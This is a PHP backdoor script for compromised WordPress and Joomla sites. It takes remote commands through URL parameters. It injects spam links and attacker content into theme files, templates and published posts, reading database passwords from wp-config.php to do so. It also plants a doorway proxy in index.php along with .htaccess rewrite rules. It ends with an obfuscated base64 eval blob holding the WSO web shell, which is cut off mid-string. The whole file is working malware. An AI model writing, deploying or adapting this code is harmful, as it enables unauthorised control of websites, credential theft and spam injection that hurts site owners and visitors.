<?php


// $table_prefix  = 'wp_';
// define('DB_NAME', 'wordpress');
// define('DB_USER', 'root');
// define('DB_PASSWORD', 'qweasd123');
// define('DB_HOST', '127.0.0.1');
// define('DB_CHARSET', 'utf8');
// define('DB_COLLATE', '');











function get_files($dir = "." , $pattern = "/php/i"){


     // RIGHT TO SEE DIR ????

     $files = array();
     if ($handle = opendir($dir)) {     
          while (false !== ($item = readdir($handle))) {        
               if (is_file("$dir/$item")) {

               if (preg_match($pattern, "$dir/$item")) {
                   $files[] = "$dir/$item";
               } 
                    
               }        
               elseif (is_dir("$dir/$item") && ($item != ".") && ($item != "..")){
                    $files = array_merge($files, get_files("$dir/$item", $pattern));
               }
          } 
          closedir($handle);
     }  
     return $files;

}


function write_content_to_new_file($file = "test.txt", $content = "test_14_content") {

     if ( file_put_contents($file, $content) ) {} else {echo "ERROR: File isn't writeable: " . $file . "\n";}
}



$db_names = array();


// write_content_to_db('127.0.0.1', 'root', 'qweasd123', 'wordpress', 'wp_', $content_to_add);
function write_content_to_db($db_server, $db_login, $db_pass, $db_name, $db_prefix, $content) {

     global $db_names;

     if (in_array($db_name, $db_names)) {
          echo "Db name: " . $db_name . " already writed.";
          return true;
     }


     $link = mysql_connect($db_server, $db_login, $db_pass);

     if (!$link) {
          echo "ERROR: Could not connect: " . mysql_error() . "\n";
          return false;
     }
     echo "Connected db successfully, db name:" . $db_name . " \n";

     mysql_select_db($db_name);
     $query = "SELECT id, post_content FROM " . $db_prefix . "posts WHERE post_status='publish' ORDER BY id DESC";
     $result = mysql_query($query);


     $row = mysql_fetch_assoc($result);

     // echo $row["post_content"];

     if ($row) {} else {
          echo "ERROR: Rows not found \n";
          return false;
     } 

     for ($i=0; $i < 2; $i++) {

          $separate_place = rand(2, strlen( $row['post_content'] )-2 );

          $first_part = substr( $row['post_content'], 0,  $separate_place );
          $second_part = substr( $row['post_content'], $separate_place );
          $new_post = $first_part . $content . $second_part;
          $new_post = mysql_real_escape_string($new_post);

          $up_query = "UPDATE " . $db_prefix . "posts SET post_content = '" . $new_post . "' WHERE id = " . $row['id'] ;
          // echo "<br>" . $up_query . "<br>";
          echo "Write to page id " . $row['id'] . "\n";
          $up_result = mysql_query($up_query);          
          $row = mysql_fetch_assoc($result);
     }

     mysql_close($link);

     $db_names[] = $db_name;

}

function parse_and_write_db($file = "test.txt", $content = "test_14_content") {
     # code...
     $content_to_add = "<a href='google.com'>feeeeuccc</a>";
     $tmp_file_data =  file_get_contents($file);

     // $table_prefix  = 'wp_';
     // define('DB_NAME', 'wordpress');
     // define('DB_USER', 'root');
     // define('DB_PASSWORD', 'qweasd123');
     // define('DB_HOST', '127.0.0.1');
     // define('DB_CHARSET', 'utf8');
     // define('DB_COLLATE', '');

     
     // $_db_prefix = preg_replace("/.*table_prefix\s*=[\"']([^\"']+?)[\"'].*/is", "$1" , $tmp_file_data);
     $_db_prefix = preg_replace("/.*table_prefix.*?[\"']([^\"']+?)[\"'].*/is", "$1" , $tmp_file_data);
     $_db_name = preg_replace("/.*define.*?DB_NAME[\"'].*?[\"']([^\"']+?)[\"'].*/is", "$1" , $tmp_file_data);
     $_db_user = preg_replace("/.*define.*?DB_USER[\"'].*?[\"']([^\"']+?)[\"'].*/is", "$1" , $tmp_file_data);
     $_db_pass = preg_replace("/.*define.*?DB_PASSWORD[\"'].*?[\"']([^\"']+?)[\"'].*/is", "$1" , $tmp_file_data);
     $_db_host = preg_replace("/.*define.*?DB_HOST[\"'].*?[\"']([^\"']+?)[\"'].*/is", "$1" , $tmp_file_data);

     write_content_to_db($_db_host, $_db_user, $_db_pass, $_db_name, $_db_prefix, $content);

}


function write_content_to_begin($file = "test.txt", $content = "test_14_content") {

     //check for already inj
     $tmp_file_data =  file_get_contents($file);
     if ( (strpos($tmp_file_data, $content)) !== false ) {
          echo "Already writed" . "\n"; 
          return false;
     }

     $file_content =  file_get_contents($file);
     $content .=  "\n";
     $content .= $file_content;
     if ( file_put_contents($file, $content) ) {} else {echo "ERROR: File isn't writeable: " . $file . "\n";}
}

function write_dor_content_to_begin($file = "test.txt", $content = "test_14_content") {

     //check for already inj
     $tmp_file_data =  file_get_contents($file);
     if ( (strpos($tmp_file_data, $content)) !== false ) {
          echo "Already writed" . "\n"; 
          return false;
     }

     $file_content =  file_get_contents($file);

     // echo "AAAA<br>";
     // delete old code from file
     $file_content = preg_replace("/<\?php.*?dor_dir.*?=.*?\;die\(\)\;\}\?>/is","" , $file_content);
     

     $content .=  "\n";
     $content .= $file_content;
     if ( file_put_contents($file, $content) ) {} else {echo "ERROR: File isn't writeable: " . $file . "\n";}
}



function write_content_to_end($file = "test.txt", $content = "test_14_content") {

     //check for already inj
     $tmp_file_data =  file_get_contents($file);
     if ( (strpos($tmp_file_data, $content)) !== false ) {
          echo "Already writed" . "\n";
          return false;
     }

     $file_content =  file_get_contents($file);
     // $file_data =  file_get_contents($file);
     // $file_data .=  "\n";
     // $file_data .=  $content;
     $content =  $file_content . "\n" . $content;
     if ( file_put_contents($file, $content) ) {} else {echo "ERROR: File isn't writeable." . $file . "\n";}
}

function write_content_to_joomla($file = "test.txt", $content = "test_14_content") {

     $i = 0;
     $handle = @fopen($file, "r");  
     while (!feof($handle)) {          

          $text = fgets($handle);

          if ( preg_match("/.*<\?php.*endif;.*/i" , $text ) ) {
               // echo "TRUE";
               $i++;
          }

          
     }
     fclose($handle);

     //check for already inj
     $tmp_file_data =  file_get_contents($file);
     if ( (strpos($tmp_file_data, $content)) !== false ) {
          echo "Already writed" . "\n";
          return false;
     }


     $file_data = "";
     $j = 0;
     $handle = @fopen($file, "r");  
     while (!feof($handle)) {          

          $text = fgets($handle);
          $file_data .= $text;
          if ( preg_match("/.*<\?php.*endif;.*/i" , $text ) ) {
               // echo "TRUE";
               $j++;
               if ($j == round($i/2)) {
                    $file_data .= $content;
               }
          }

          
     }    // end of while
     fclose($handle);


     if ( file_put_contents($file, $file_data) ) {} else {echo "ERROR: File isn't writeable." . $file . "\n";}


}


function echo_arr($arr) {
     foreach ($arr as $key => $value) {
         echo "$key : $value"  . "\n";
     }
}


if ( isset($_GET['r']) ) {
     $req = $_GET['r'];
} else {
     $req = "";
}


if ($req == "status") {
     echo "alive";
     exit;
     // echo "sss";
}

if ($req == "add") {

     $cont = $_POST['c'];
     // $cont = $_GET['c'];

     if ( isset($_GET['ty']) ) {
          $ctype = $_GET['ty'];
     } else {
          // default type
          $ctype = "template";
     }

     $cont = str_replace("\\", "", $cont); 
     $dir = "../..";
     


     // try joomla
     $files_to_write = get_files($dir, "/templates\/.*\/index\.php/i");

     //if joomla
     if (count($files_to_write)>0) {

          echo "JOOMLA" ."\n" ;
          foreach ($files_to_write as $key => $value) {
               write_content_to_joomla($value, $cont );
          }
          echo_arr($files_to_write);
     }



     if ($ctype == "article") {

          // try WP db
          $files_to_write = get_files($dir, "/wp-config.php/i");


          if ( count($files_to_write) == 0 ) {

               $dir = "..";
               $files_to_write = get_files($dir, "/wp-config.php/i");

          }

          if (count($files_to_write)>0) {

               echo "FOUND WP DB files" ."\n" ;
               echo_arr($files_to_write);
               foreach ($files_to_write as $key => $value) {
                    parse_and_write_db($value, $cont);
               }
          } else {
               // echo "ERROR: No files to write \n" ;
          }
          
          // exit;  continue ??
          // exit;
     }
     

     if ($ctype == "template") {

          // try WP
          $chance = rand(1,2);
          // header
          if ($chance == 1) {
               $files_to_write = get_files($dir, "/themes\/.*\/header.*\.php/i");
               
               if (count($files_to_write)>0) {
                    echo "WP" ."\n" ;
                    foreach ($files_to_write as $key => $value) {
                         write_content_to_end($value, $cont );
                    }
                    echo_arr($files_to_write);
               }

          }

          // footer
          if ($chance == 2) {
               $files_to_write = get_files($dir, "/themes\/.*\/footer.*\.php/i");
               if (count($files_to_write)>0) {
                    echo "WP" ."\n" ;
                    foreach ($files_to_write as $key => $value) {
                         
                              write_content_to_begin($value, $cont );
                    }
                    echo_arr($files_to_write);
               }
          }

     }


     exit;


}




if ($req == "addd") {


     echo "Try to add dor..." . "\n";

     $durl = $_GET['c'];
     $durl = str_replace("\\", "", $durl); 

     $dkey = "xxx";
     $dkey = $_GET['k'];
     $dkey = str_replace("\\", "", $dkey); 

     $dtype = "yes";
     $dtype = $_GET['t'];
     $dtype = str_replace("\\", "", $dtype); 

     $dkey = $_GET['k'];
     $dkey = str_replace("\\", "", $dkey); 

     $dfile = "link.php";
     $dir = "../../..";

     $cont = '<' . '?' . 'php $dor_dir = "'  . $durl . '";' ;

     $cont .= 'function get_content2($URL){$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $URL);curl_setopt($ch, CURLOPT_HEADER, 0);curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 0);curl_setopt($ch, CURLOPT_RETURNTRANSFER, TRUE);curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"]);$result = curl_exec($ch);if ( strpos($result, "Moved Permanently") !== false ) {$r_url = preg_replace("/^.*href\s*=\s*[\"\']([^\"\'>]+?)([\"\'>]+).*/is","$1",$result);header("Location: " . $r_url);exit;}curl_close($ch);return $result;}';


     /*
     $cont .= 'if(isset($_GET["xxx"])){$page_to_get=$_GET["xxx"];$dor_way=$dor_dir.$page_to_get.".html";$dor_content=get_content2($dor_way);$dor_content=preg_replace("#(<\s*a\s+[^>]*href\s*=\s*[\"\'])(?!http)([^\"\'>]+)(\.html)([\"\'>]+)#","$1".$_SERVER["SCRIPT_NAME"]."?xxx="."$2"."$4",$dor_content);$dor_content=preg_replace("#(<\s*?link\s+[^>]*.*?href\s*=\s*[\"\'])(.*?)(\.css)([\"\'].*?>)#","$1".$_SERVER["SCRIPT_NAME"]."?xcss="."$2"."$4",$dor_content);$dor_content=preg_replace("#(<\s*?script\s+[^>]*.*?src\s*=\s*[\"\'])(.*?)(\.js)([\"\'].*?>)#","$1".$_SERVER["SCRIPT_NAME"]."?xjs="."$2"."$4",$dor_content);echo $dor_content;die();}';
     */

     if ($dtype=="yes") {
          //htaccess version
          $cont .= 'if(isset($_GET["' . $dkey . '"])){$page_to_get=$_GET["' . $dkey . '"];$dor_way=$dor_dir.$page_to_get.".html";$dor_content=get_content2($dor_way);$dor_content=preg_replace("#(<\s*a\s+[^>]*href\s*=\s*[\"\'])(?!http)([^\"\'>]+)(\.html)([\"\'>]+)#","$1" . "/' . $dkey. '/" . "$2" . "$4", $dor_content);$dor_content=preg_replace("#(<\s*?link\s+[^>]*.*?href\s*=\s*[\"\'])(.*?)(\.css)([\"\'].*?>)#","$1".$_SERVER["SCRIPT_NAME"]."?xcss="."$2"."$4",$dor_content);$dor_content=preg_replace("#(<\s*?script\s+[^>]*.*?src\s*=\s*[\"\'])(.*?)(\.js)([\"\'].*?>)#","$1".$_SERVER["SCRIPT_NAME"]."?xjs="."$2"."$4",$dor_content);echo $dor_content;die();}';
     } else {
          //No htaccess version
          $cont .= 'if(isset($_GET["' . $dkey . '"])){$page_to_get=$_GET["' . $dkey . '"];$dor_way=$dor_dir.$page_to_get.".html";$dor_content=get_content2($dor_way);$dor_content=preg_replace("#(<\s*a\s+[^>]*href\s*=\s*[\"\'])(?!http)([^\"\'>]+)(\.html)([\"\'>]+)#","$1" . "?' . $dkey. '=" . "$2" . "$4", $dor_content);$dor_content=preg_replace("#(<\s*?link\s+[^>]*.*?href\s*=\s*[\"\'])(.*?)(\.css)([\"\'].*?>)#","$1".$_SERVER["SCRIPT_NAME"]."?xcss="."$2"."$4",$dor_content);$dor_content=preg_replace("#(<\s*?script\s+[^>]*.*?src\s*=\s*[\"\'])(.*?)(\.js)([\"\'].*?>)#","$1".$_SERVER["SCRIPT_NAME"]."?xjs="."$2"."$4",$dor_content);echo $dor_content;die();}';    
     }



     $cont .= 'if(isset($_GET["xcss"])){$page_to_get=$_GET["xcss"];$dor_way=$dor_dir.$page_to_get.".css";header("Content-Type:text/css");$css_content=get_content2($dor_way);echo$css_content;die();}';
     $cont .= 'if(isset($_GET["xjs"])){$page_to_get=$_GET["xjs"];$dor_way=$dor_dir.$page_to_get.".js";header("Content-Type:text/javascript");$css_content=get_content2($dor_way);echo$css_content;die();}';
     
     $cont .= "?".">";



     $ht_cont =  "RewriteEngine on \n";
     $ht_cont .= "RewriteBase / \n";
     $ht_cont .= "RewriteRule ^". $dkey ."/(.*)$ index.php?" . $dkey . "=$1 [L] \n";



     $files_to_check = get_files($dir, "/index\.php/i");

     if ( count($files_to_check) == 0 ) {

          $dir = "../..";
          $files_to_check = get_files($dir, "/index\.php/i");

          if ( count($files_to_check) == 0 ) {

               $dir = "..";
               $files_to_check = get_files($dir, "/index\.php/i");

          }

     }



     echo "files to check: \n";
     print_r($files_to_check);


     $files_to_write = array();

     foreach ($files_to_check as $key => $value) {
          if ($file_cont = file_get_contents($value)) {
               if (preg_match("/Front to the WordPress application/i", $file_cont)) {
                    $files_to_write[] = $value;
               }
          } else {
               echo "Cant read file: "  . $value . "\n";
          }
     }


     if ( count($files_to_write) == 0 ) {
          echo "ERROR: No files to write \n" ;
     }


     foreach ($files_to_write as $key => $value) {
          echo "Try write to file: " . $value . "\n";
          write_dor_content_to_begin($value, $cont);

          //htaccess write
          echo "Try write to file: " . str_replace("index.php", ".htaccess", $value) . "\n";
          write_content_to_begin(str_replace("index.php", ".htaccess", $value), $ht_cont);          

     }


     exit;

}



if ($req == "geturls") {


     // $cont = $_POST['c'];
     // $cont = $_GET['c'];
     // $cont = str_replace("\\", "", $cont); 
     $dir = "../..";
     

     $files_to_check = get_files($dir, "/themes\/.*\.php/i");


     $urls_arr = array();

     foreach ($files_to_check as $key => $value) {
          if ($file_cont = file_get_contents($value)) {
               // echo "f";
               if (preg_match("/<script.*?script>/i", $file_cont, $scr_matches)) {
               // if (preg_match("/script/i", $file_cont)) {
                    // echo "s";
                    // print_r($scr_matches);
                    foreach ($scr_matches as $key0 => $value0) {
                         echo $value . ":  " . $value0 . "\n";
                    }
                    // $urls_arr[] = $value;
               }
          } else {
               // echo "Cant read file: "  . $value . "\n";
          }
     }

     // print_r($urls_arr);
     exit;

}


 eval(base64_decode("CiRhdXRoX3Bhc3MgPSAiN2U5NDI0YmZhMTJkMWYyYWQzMjQ2M2FjMWE4MGU0MDciOyAjIHRlc3QKJGNvbG9yID0gIiNkZjUiOwokZGVmYXVsdF9hY3Rpb24gPSAnRmlsZXNNYW4nOwokZGVmYXVsdF91c2VfYWpheCA9IHRydWU7CiRkZWZhdWx0X2NoYXJzZXQgPSAnV2luZG93cy0xMjUxJzsKCmlmKCFlbXB0eSgkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSB7CiAgICAkdXNlckFnZW50cyA9IGFycmF5KCJHb29nbGUiLCAiU2x1cnAiLCAiTVNOQm90IiwgImlhX2FyY2hpdmVyIiwgIllhbmRleCIsICJSYW1ibGVyIik7CiAgICBpZihwcmVnX21hdGNoKCcvJyAuIGltcGxvZGUoJ3wnLCAkdXNlckFnZW50cykgLiAnL2knLCAkX1NFUlZFUlsnSFRUUF9VU0VSX0FHRU5UJ10pKSB7CiAgICAgICAgaGVhZGVyKCdIVFRQLzEuMCA0MDQgTm90IEZvdW5kJyk7CiAgICAgICAgZXhpdDsKICAgIH0KfQoKQGluaV9zZXQoJ2Vycm9yX2xvZycsTlVMTCk7CkBpbmlfc2V0KCdsb2dfZXJyb3JzJywwKTsKQGluaV9zZXQoJ21heF9leGVjdXRpb25fdGltZScsMCk7CkBzZXRfdGltZV9saW1pdCgwKTsKQHNldF9tYWdpY19xdW90ZXNfcnVudGltZSgwKTsKQGRlZmluZSgnV1NPX1ZFUlNJT04nLCAnMi41Jyk7CgppZihnZXRfbWFnaWNfcXVvdGVzX2dwYygpKSB7CglmdW5jdGlvbiBXU09zdHJpcHNsYXNoZXMoJGFycmF5KSB7CgkJcmV0dXJuIGlzX2FycmF5KCRhcnJheSkgPyBhcnJheV9tYXAoJ1dTT3N0cmlwc2xhc2hlcycsICRhcnJheSkgOiBzdHJpcHNsYXNoZXMoJGFycmF5KTsKCX0KCSRfUE9TVCA9IFdTT3N0cmlwc2xhc2hlcygkX1BPU1QpOwogICAgJF9DT09LSUUgPSBXU09zdHJpcHNsYXNoZXMoJF9DT09LSUUpOwp9CgpmdW5jdGlvbiB3c29Mb2dpbigpIHsKCWRpZSgiPHByZSBhbGlnbj1jZW50ZXI+PGZvcm0gbWV0aG9kPXBvc3Q+UGFzc3dvcmQ6IDxpbnB1dCB0eXBlPXBhc3N3b3JkIG5hbWU9cGFzcz48aW5wdXQgdHlwZT1zdWJtaXQgdmFsdWU9Jz4+Jz48L2Zvcm0+PC9wcmU+Iik7Cn0KCmZ1bmN0aW9uIFdTT3NldGNvb2tpZSgkaywgJHYpIHsKICAgICRfQ09PS0lFWyRrXSA9ICR2OwogICAgc2V0Y29va2llKCRrLCAkdik7Cn0KCmlmKCFlbXB0eSgkYXV0aF9wYXNzKSkgewogICAgaWYoaXNzZXQoJF9QT1NUWydwYXNzJ10pICYmIChtZDUoJF9QT1NUWydwYXNzJ10pID09ICRhdXRoX3Bhc3MpKQogICAgICAgIFdTT3NldGNvb2tpZShtZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSwgJGF1dGhfcGFzcyk7CgogICAgaWYgKCFpc3NldCgkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKV0pIHx8ICgkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKV0gIT0gJGF1dGhfcGFzcykpCiAgICAgICAgd3NvTG9naW4oKTsKfQoKaWYoc3RydG9sb3dlcihzdWJzdHIoUEhQX09TLDAsMykpID09ICJ3aW4iKQoJJG9zID0gJ3dpbic7CmVsc2UKCSRvcyA9ICduaXgnOwoKJHNhZmVfbW9kZSA9IEBpbmlfZ2V0KCdzYWZlX21vZGUnKTsKaWYoISRzYWZlX21vZGUpCiAgICBlcnJvcl9yZXBvcnRpbmcoMCk7CgokZGlzYWJsZV9mdW5jdGlvbnMgPSBAaW5pX2dldCgnZGlzYWJsZV9mdW5jdGlvbnMnKTsKJGhvbWVfY3dkID0gQGdldGN3ZCgpOwppZihpc3NldCgkX1BPU1RbJ2MnXSkpCglAY2hkaXIoJF9QT1NUWydjJ10pOwokY3dkID0gQGdldGN3ZCgpOwppZigkb3MgPT0gJ3dpbicpIHsKCSRob21lX2N3ZCA9IHN0cl9yZXBsYWNlKCJcXCIsICIvIiwgJGhvbWVfY3dkKTsKCSRjd2QgPSBzdHJfcmVwbGFjZSgiXFwiLCAiLyIsICRjd2QpOwp9CmlmKCRjd2Rbc3RybGVuKCRjd2QpLTFdICE9ICcvJykKCSRjd2QgLj0gJy8nOwoKaWYoIWlzc2V0KCRfQ09PS0lFW21kNSgkX1NFUlZFUlsnSFRUUF9IT1NUJ10pIC4gJ2FqYXgnXSkpCiAgICAkX0NPT0tJRVttZDUoJF9TRVJWRVJbJ0hUVFBfSE9TVCddKSAuICdhamF4J10gPSAoYm9vbCkkZGVmYXVsdF91c2VfYWpheDsKCmlmKCRvcyA9PSAnd2luJykKCSRhbGlhc2VzID0gYXJyYXkoCgkJIkxpc3QgRGlyZWN0b3J5IiA9PiAiZGlyIiwKICAgIAkiRmluZCBpbmRleC5waHAgaW4gY3VycmVudCBkaXIiID0+ICJkaXIgL3MgL3cgL2IgaW5kZXgucGhwIiwKICAgIAkiRmluZCAqY29uZmlnKi5waHAgaW4gY3VycmVudCBkaXIiID0+ICJkaXIgL3MgL3cgL2IgKmNvbmZpZyoucGhwIiwKICAgIAkiU2hvdyBhY3RpdmUgY29ubmVjdGlvbnMiID0+ICJuZXRzdGF0IC1hbiIsCiAgICAJIlNob3cgcnVubmluZyBzZXJ2aWNlcyIgPT4gIm5ldCBzdGFydCIsCiAgICAJIlVzZXIgYWNjb3VudHMiID0+ICJuZXQgdXNlciIsCiAgICAJIlNob3cgY29tcHV0ZXJzIiA9PiAibmV0IHZpZXciLAoJCSJBUlAgVGFibGUiID0+ICJhcnAgLWEiLAoJCSJJUCBDb25maWd1cmF0aW9uIiA9PiAiaXBjb25maWcgL2FsbCIKCSk7CmVsc2UKCSRhbGlhc2VzID0gYXJyYXkoCiAgCQkiTGlzdCBkaXIiID0+ICJscyAtbGhhIiwKCQkibGlzdCBmaWxlIGF0dHJpYnV0ZXMgb24gYSBMaW51eCBzZWNvbmQgZXh0ZW5kZWQgZmlsZSBzeXN0ZW0iID0+ICJsc2F0dHIgLXZhIiwKICAJCSJzaG93IG9wZW5lZCBwb3J0cyIgPT4gIm5ldHN0YXQgLWFuIHwgZ3JlcCAtaSBsaXN0ZW4iLAogICAgICAgICJwcm9jZXNzIHN0YXR1cyIgPT4gInBzIGF1eCIsCgkJIkZpbmQiID0+ICIiLAogIAkJImZpbmQgYWxsIHN1aWQgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtcGVybSAtMDQwMDAgLWxzIiwKICAJCSJmaW5kIHN1aWQgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXR5cGUgZiAtcGVybSAtMDQwMDAgLWxzIiwKICAJCSJmaW5kIGFsbCBzZ2lkIGZpbGVzIiA9PiAiZmluZCAvIC10eXBlIGYgLXBlcm0gLTAyMDAwIC1scyIsCiAgCQkiZmluZCBzZ2lkIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLXBlcm0gLTAyMDAwIC1scyIsCiAgCQkiZmluZCBjb25maWcuaW5jLnBocCBmaWxlcyIgPT4gImZpbmQgLyAtdHlwZSBmIC1uYW1lIGNvbmZpZy5pbmMucGhwIiwKICAJCSJmaW5kIGNvbmZpZyogZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtbmFtZSBcImNvbmZpZypcIiIsCiAgCQkiZmluZCBjb25maWcqIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLW5hbWUgXCJjb25maWcqXCIiLAogIAkJImZpbmQgYWxsIHdyaXRhYmxlIGZvbGRlcnMgYW5kIGZpbGVzIiA9PiAiZmluZCAvIC1wZXJtIC0yIC1scyIsCiAgCQkiZmluZCBhbGwgd3JpdGFibGUgZm9sZGVycyBhbmQgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXBlcm0gLTIgLWxzIiwKICAJCSJmaW5kIGFsbCBzZXJ2aWNlLnB3ZCBmaWxlcyIgPT4gImZpbmQgLyAtdHlwZSBmIC1uYW1lIHNlcnZpY2UucHdkIiwKICAJCSJmaW5kIHNlcnZpY2UucHdkIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLW5hbWUgc2VydmljZS5wd2QiLAogIAkJImZpbmQgYWxsIC5odHBhc3N3ZCBmaWxlcyIgPT4gImZpbmQgLyAtdHlwZSBmIC1uYW1lIC5odHBhc3N3ZCIsCiAgCQkiZmluZCAuaHRwYXNzd2QgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXR5cGUgZiAtbmFtZSAuaHRwYXNzd2QiLAogIAkJImZpbmQgYWxsIC5iYXNoX2hpc3RvcnkgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtbmFtZSAuYmFzaF9oaXN0b3J5IiwKICAJCSJmaW5kIC5iYXNoX2hpc3RvcnkgZmlsZXMgaW4gY3VycmVudCBkaXIiID0+ICJmaW5kIC4gLXR5cGUgZiAtbmFtZSAuYmFzaF9oaXN0b3J5IiwKICAJCSJmaW5kIGFsbCAuZmV0Y2htYWlscmMgZmlsZXMiID0+ICJmaW5kIC8gLXR5cGUgZiAtbmFtZSAuZmV0Y2htYWlscmMiLAogIAkJImZpbmQgLmZldGNobWFpbHJjIGZpbGVzIGluIGN1cnJlbnQgZGlyIiA9PiAiZmluZCAuIC10eXBlIGYgLW5hbWUgLmZldGNobWFpbHJjIiwKCQkiTG9jYXRlIiA9PiAiIiwKICAJCSJsb2NhdGUgaHR0cGQuY29uZiBmaWxlcyIgPT4gImxvY2F0ZSBodHRwZC5jb25mIiwKCQkibG9jYXRlIHZob3N0cy5jb25mIGZpbGVzIiA9PiAibG9jYXRlIHZob3N0cy5jb25mIiwKCQkibG9jYXRlIHByb2Z0cGQuY29uZiBmaWxlcyIgPT4gImxvY2F0ZSBwcm9mdHBkLmNvbmYiLAoJCSJsb2NhdGUgcHN5Ym5jLmNvbmYgZmlsZXMiID0+ICJsb2NhdGUgcHN5Ym5jLmNvbmYiLAoJCSJsb2NhdGUgbXkuY29uZiBmaWxlcyIgPT4gImxvY2F0ZSBteS5jb25mIiwKCQkibG9jYXRlIGFkbWluLnBocCBmaWxlcyIgPT4ibG9jYXRlIGFkbWluLnBocCIsCgkJImxvY2F0ZSBjZmcucGhwIGZpbGVzIiA9PiAibG9jYXRlIGNmZy5waHAiLAoJCSJsb2NhdGUgY29uZi5waHAgZmlsZXMiID0+ICJsb2NhdGUgY29uZi5waHAiLAoJCSJsb2NhdGUgY29uZmlnLmRhdCBmaWxlcyIgPT4gImxvY2F0ZSBjb25maWcuZGF0IiwKCQkibG9jYXRlIGNvbmZpZy5waHAgZmlsZXMiID0+ICJsb2NhdGUgY29uZmlnLnBocCIsCgkJImxvY2F0ZSBjb25maWcuaW5jIGZpbGVzIiA9PiAibG9jYXRlIGNvbmZpZy5pbmMiLAoJCSJsb2NhdGUgY29uZmlnLmluYy5waHAiID0+ICJsb2NhdGUgY29uZmlnLmluYy5waHAiLAoJCSJsb2NhdGUgY29uZmlnLmRlZmF1bHQucGhwIGZpbGVzIiA9PiAibG9jYXRlIGNvbmZpZy5kZWZhdWx0LnBocCIsCgkJImxvY2F0ZSBjb25maWcqIGZpbGVzICIgPT4gImxvY2F0ZSBjb25maWciLAoJCSJsb2NhdGUgLmNvbmYgZmlsZXMiPT4ibG9jYXRlICcuY29uZiciLAoJCSJsb2NhdGUgLnB3ZCBmaWxlcyIgPT4gImxvY2F0ZSAnLnB3ZCciLAoJCSJsb2NhdGUgLnNxbCBmaWxlcyIgPT4gImxvY2F0ZSAnLnNxbCciLAoJCSJsb2NhdGUgLmh0cGFzc3dkIGZpbGVzIiA9PiAibG9jYXRlICcuaHRwYXNzd2QnIiwKCQkibG9jYXRlIC5iYXNoX2hpc3RvcnkgZmlsZXMiID0+ICJsb2NhdGUgJy5iYXNoX2hpc3RvcnknIiwKCQkibG9jYXRlIC5teXNxbF9oaXN0b3J5IGZpbGVzIiA9PiAibG9jYXRlICcubXlzcWxfaGlzdG9yeSciLAoJCSJsb2NhdGUgLmZldGNobWFpbHJjIGZpbGVzIiA9PiAibG9jYXRlICcuZmV0Y2htYWlscmMnIiwKCQkibG9jYXRlIGJhY2t1cCBmaWxlcyIgPT4gImxvY2F0ZSBiYWNrdXAiLAoJCSJsb2NhdGUgZHVtcCBmaWxlcyIgPT4gImxvY2F0ZSBkdW1wIiwKCQkibG9jYXRlIHByaXYgZmlsZXMiID0+ICJsb2NhdGUgcHJpdiIKCSk7CgpmdW5jdGlvbiB3c29IZWFkZXIoKSB7CglpZihlbXB0eSgkX1BPU1RbJ2NoYXJzZXQnXSkpCgkJJF9QT1NUWydjaGFyc2V0J10gPSAkR0xPQkFMU1snZGVmYXVsdF9jaGFyc2V0J107CglnbG9iYWwgJGNvbG9yOwoJZWNobyAiPGh0bWw+PGhlYWQ+PG1ldGEgaHR0cC1lcXVpdj0nQ29udGVudC1UeXBlJyBjb250ZW50PSd0ZXh0L2h0bWw7IGNoYXJzZXQ9IiAuICRfUE9TVFsnY2hhcnNldCddIC4gIic+PHRpdGxlPiIgLiAkX1NFUlZFUlsnSFRUUF9IT1NUJ10gLiAiIC0gV1NPICIgLiBXU09fVkVSU0lPTiAuIjwvdGl0bGU+CjxzdHlsZT4KYm9keXtiYWNrZ3JvdW5kLWNvbG9yOiM0NDQ7Y29sb3I6I2UxZTFlMTt9CmJvZHksdGQsdGh7IGZvbnQ6IDlwdCBMdWNpZGEsVmVyZGFuYTttYXJnaW46MDt2ZXJ0aWNhbC1hbGlnbjp0b3A7Y29sb3I6I2UxZTFlMTsgfQp0YWJsZS5pbmZveyBjb2xvcjojZmZmO2JhY2tncm91bmQtY29sb3I6IzIyMjsgfQpzcGFuLGgxLGF7IGNvbG9yOiAkY29sb3IgIWltcG9ydGFudDsgfQpzcGFueyBmb250LXdlaWdodDogYm9sZGVyOyB9CmgxeyBib3JkZXItbGVmdDo1cHggc29saWQgJGNvbG9yO3BhZGRpbmc6IDJweCA1cHg7Zm9udDogMTRwdCBWZXJkYW5hO2JhY2tncm91bmQtY29sb3I6IzIyMjttYXJnaW46MHB4OyB9CmRpdi5jb250ZW50eyBwYWRkaW5nOiA1cHg7bWFyZ2luLWxlZnQ6NXB4O2JhY2tncm91bmQtY29sb3I6IzMzMzsgfQpheyB0ZXh0LWRlY29yYXRpb246bm9uZTsgfQphOmhvdmVyeyB0ZXh0LWRlY29yYXRpb246dW5kZXJsaW5lOyB9Ci5tbDF7IGJvcmRlcjoxcHggc29saWQgIzQ0NDtwYWRkaW5nOjVweDttYXJnaW46MDtvdmVyZmxvdzogYXV0bzsgfQouYmlnYXJlYXsgd2lkdGg6MTAwJTtoZWlnaHQ6MzAwcHg7IH0KaW5wdXQsdGV4dGFyZWEsc2VsZWN0eyBtYXJnaW46MDtjb2xvcjojZmZmO2JhY2tncm91bmQtY29sb3I6IzU1NTtib3JkZXI6MXB4IHNvbGlkICRjb2xvcjsgZm9udDogOXB0IE1vbm9zcGFjZSwnQ291cmllciBOZXcnOyB9CmZvcm17IG1hcmdpbjowcHg7IH0KI3Rvb2xzVGJseyB0ZXh0LWFsaWduOmNlbnRlcjsg